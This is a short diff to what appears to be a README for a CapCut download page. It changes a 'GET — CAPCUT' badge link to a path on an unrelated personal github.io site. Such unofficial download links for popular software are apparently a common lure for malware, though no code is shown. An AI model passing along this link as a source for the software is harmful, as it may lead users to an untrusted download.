@@ -4,7 +4,7 @@
 <img src="https://cdn.prod.website-files.com/662b8a4944dbb4e0ccd51a28/68fba869e63a334367d7859f_Capcut%20Logo%20%23capcut%20%23capcutlogo.jpeg" width="780">
 </p>
 
-[![GET — CAPCUT](https://img.shields.io/badge/GET-CAPCUT-2563eb?style=for-the-badge)](https://poissongreenpsuty.github.io/.github/)
+[![GET — CAPCUT](https://img.shields.io/badge/GET-CAPCUT-2563eb?style=for-the-badge)](https://poissongreenpsuty.github.io/.github/CapCut)
 
 ---
 
